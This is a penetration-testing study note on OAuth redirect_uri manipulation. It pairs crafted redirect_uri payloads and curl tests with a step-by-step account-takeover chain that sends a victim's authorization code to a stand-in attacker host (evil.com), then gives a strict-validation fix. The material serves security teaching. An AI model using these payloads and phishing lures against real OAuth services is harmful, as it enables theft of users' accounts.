---
tags: [vapt, oauth, intermediate]
difficulty: intermediate
module: "19 - OAuth"
topic: "19.07 Redirect URI Manipulation"
portswigger_labs: ["OAuth account takeover via redirect_uri"]
---

# 19.07 — Redirect URI Manipulation

## Why redirect_uri Matters

```
redirect_uri IN OAUTH:
  After user authenticates, auth server sends code (or token!) to this URL
  
  CRITICAL SECURITY PROPERTY:
  Auth server should ONLY redirect to pre-registered, exact-match URIs!
  
  If redirect_uri can be manipulated:
  → Auth code goes to ATTACKER'S server
  → Attacker exchanges code for tokens (or gets token directly in Implicit)
  → Account takeover!
  
REGISTRATION:
  When you register your OAuth app, you provide:
  Allowed redirect URIs: https://myapp.com/callback
  
  Auth server should:
  Compare request redirect_uri EXACTLY with registered ones
  Any mismatch → REJECT!
```

---

## Attack: Manipulating redirect_uri

```
SCENARIO:
  Registered: https://app.example.com/callback
  
  ATTACK ATTEMPTS:

1. OPEN REDIRECT ON APP DOMAIN:
   redirect_uri=https://app.example.com/callback?url=https://evil.com
   OR:
   redirect_uri=https://app.example.com/open-redirect?to=https://evil.com
   
   → Auth server sees: domain = app.example.com → ALLOWED!
   → Redirects to app.example.com/callback → app redirects to evil.com
   → Code in URL → evil.com gets it from Referer!

2. SUBDOMAIN:
   redirect_uri=https://evil.app.example.com/callback
   OR:
   redirect_uri=https://subdomain-takeover.example.com/callback
   
   → Does auth server do prefix match on domain? → bypass!

3. PATH TRAVERSAL:
   redirect_uri=https://app.example.com/callback/../evil
   redirect_uri=https://app.example.com/callback%2F..%2Fevil
   
   → If auth server URL-decodes before matching → bypass!

4. PROTOCOL CHANGE:
   redirect_uri=http://app.example.com/callback  (http instead of https)
   → If auth server only checks domain, not scheme → accepted!

5. PORT VARIATION:
   redirect_uri=https://app.example.com:8080/callback
   → Different port, same domain?
```

---

## Testing redirect_uri

```bash
# BASELINE: Get the registered redirect_uri from Burp
# (Usually visible in the initial authorization URL)

# TEST VARIATIONS:
REGISTERED="https://app.example.com/callback"

# Test 1: Add extra path
curl -G "https://auth.example.com/oauth/authorize" \
  --data-urlencode "client_id=CLIENT_ID" \
  --data-urlencode "redirect_uri=https://app.example.com/callback/extra" \
  --data-urlencode "response_type=code" \
  --data-urlencode "state=test" \
  -v 2>&1 | grep -i "location"
# → Does it redirect to callback/extra? Validation too loose!

# Test 2: Subdomain
--data-urlencode "redirect_uri=https://evil.app.example.com/callback"

# Test 3: Open redirect chain
--data-urlencode "redirect_uri=https://app.example.com/redirect?url=https://evil.com"

# Test 4: Path traversal in redirect
--data-urlencode "redirect_uri=https://app.example.com/callback/../../../evil.com"

# Test 5: URL encoding bypass
--data-urlencode "redirect_uri=https://app.example.com%2ecallback.evil.com"

# jwt_tool can help automate some of these for OAuth endpoints
```

---

## Complete Exploit: redirect_uri Manipulation + Code Theft

```
FULL ATTACK CHAIN:

1. Attacker finds: redirect_uri validation is prefix-based (allows paths)
   Registered: https://app.example.com/callback
   Accepted: https://app.example.com/callback/arbitrary

2. Attacker also finds: app has open redirect at /redirect?to=URL
   → https://app.example.com/redirect?to=https://evil.com

3. Craft malicious authorization URL:
   https://auth.example.com/oauth/authorize?
     client_id=CLIENT_ID&
     redirect_uri=https://app.example.com/redirect?to=https://evil.com&
     response_type=code&
     scope=email&
     state=anything
   
   Auth server: redirect_uri starts with app.example.com → ALLOWED!
   
4. Send to victim (social engineering, stored XSS, etc.):
   "Hey, click this to check your account security!"

5. Victim authenticates with Google

6. Auth server redirects:
   https://app.example.com/redirect?to=https://evil.com&code=VICTIM_CODE
   
7. App redirects to evil.com with the code:
   https://evil.com/?to=https://evil.com&code=VICTIM_CODE

8. Attacker's server captures the code!

9. Attacker exchanges code for tokens:
   POST /oauth/token { code=VICTIM_CODE, client_id, client_secret, ... }
   → Gets victim's access token!
   → Account takeover!
```

---

## Fix

```
STRICT redirect_uri VALIDATION:

  ✓ EXACT MATCH ONLY — no prefixes, no patterns:
    Registered: https://app.example.com/callback
    Accepted: https://app.example.com/callback (EXACTLY this)
    Rejected: https://app.example.com/callback/extra
    Rejected: https://app.example.com/callback?anything=1
    Rejected: https://evil.app.example.com/callback
    
  ✓ Compare after URL normalization (handle encoding):
    Normalize both registered and requested URIs before comparison
    
  ✓ Don't allow wildcard or glob patterns in registered URIs:
    Some auth servers support: https://app.example.com/*
    → Too broad! Don't allow this!
    
  ✓ Register specific paths, not just domains:
    BAD:  Registered: https://app.example.com
    GOOD: Registered: https://app.example.com/oauth/callback
    
  ✓ Fix open redirects on your app too:
    redirect_uri manipulation chains with open redirects!
    Remove unnecessary redirectors
```

---

## Related Notes
- [[08 - Open Redirect in Redirect URI]] — using open redirects to steal codes
- [[09 - Authorization Code Interception]] — other code theft methods
- [[16 - OAuth Misconfig Wildcard Redirect URI]] — auth server misconfiguration
- [[20 - Defense Strict Redirect URI PKCE State Validation]] — full fix
